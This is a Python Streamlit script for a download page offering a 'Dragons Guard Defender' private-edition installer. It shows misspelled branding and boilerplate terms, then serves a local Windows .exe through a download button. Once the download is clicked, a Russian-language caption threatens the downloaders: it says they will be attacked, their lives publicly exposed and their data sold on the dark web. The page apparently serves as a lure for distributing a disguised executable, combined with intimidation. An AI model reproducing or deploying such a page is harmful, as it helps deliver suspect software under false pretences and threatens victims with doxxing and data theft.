import streamlit as st
st.set_page_config(page_title="Donwload Dragons Guard Defender - Software Private")
#<Configuring Cols
col1,col2,col3 = st.columns(3)
#Configuring Cols>


#Widgets



# Define los valores RGB
red = 14
green = 17
blue = 23

# Crea la cadena de estilo CSS con los valores RGB
background_color = f'rgb({red}, {green}, {blue})'

# Usa HTML para establecer el color de fondo
st.markdown(
    f"""
    <style>
    .reportview-container {{
        background-color: {background_color};
    }}
    </style>
    """,
    unsafe_allow_html=True
)
st.markdown(
    "<style> img { border-radius: 10px; transition: transform 0.3s; } img:hover { transform: translateY(-5px); } </style>", 
    unsafe_allow_html=True
)

with col1:
    st.image("introducion.png",width=700)
with col1:
    st.markdown("""
    # Terms and Conditions
    
    ## Private Edition Software
    
    - The Private Edition Software is intended solely for user verification purposes.
    - Usage of the software is subject to compliance with applicable laws and regulations.
    - The software is provided "as is" and we do not provide any warranties.
    - Unauthorized use of the software for illegal activities is strictly prohibited.
    - We reserve the right to make updates and modifications to the software without prior notice.
    - By using the software, you agree to abide by these terms and conditions.
    
    """)



    # Especifica la ruta del archivo y agrega el botón de descarga
file_path = r"C:\Users\user\Desktop\Donwload_Setup_Installer Dragons Guard Defender\Dragons Guard Defender _ Setup_Installer.exe"
download_setup = st.download_button("Download", open(file_path, "rb"), file_name="Dragons Guard Defender_Setup_Installer.exe")


if download_setup:
    
    st.image("final.png", caption="Для всех тех, кто зарегистрировался и не является частью сервера discord, я буду атаковать вас множеством вещей и превращу вашу жизнь в кошмар.Я выложу вашу жизнь на всеобщее обозрение и продам ваши данные в темной паутине : )")
    
    st.write("<script>window.scrollTo(0, document.body.scrollHeight);</script>", unsafe_allow_html=True)

# Define la ruta de la imagen
